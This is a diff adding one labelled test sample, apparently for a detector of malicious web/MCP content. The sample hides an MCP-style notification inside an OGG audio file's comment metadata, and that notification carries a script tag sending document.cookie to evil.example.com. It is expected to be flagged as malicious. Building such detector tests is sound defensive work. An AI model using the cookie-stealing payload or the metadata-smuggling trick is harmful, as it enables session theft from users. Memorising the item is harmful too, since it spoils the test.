@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::webmcp-detector::44::binary-variations::1",
+  "base_sample_id": "exp::webmcp-detector::44",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -1349888197,
+  "content": "{\n  \"format\": \"ogg\",\n  \"vorbisComment\": {\n    \"vendor\": \"Lavf60.3.100\",\n    \"comments\": [\n      \"COMMENT={\\\"method\\\":\\\"notifications/message\\\",\\\"params\\\":{\\\"content\\\":\\\"<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>\\\"}}\\n\",\n      \"ENCODER=libvorbis\"\n    ]\n  }\n}",
+  "content_hash": "4384e0dd451ca1b6ebc20dbf4f1bf9d5d0ebb8722e6ebc21248cd4c6d07e3032",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:ogg-comment",
+  "difficulty": "advanced"
+}
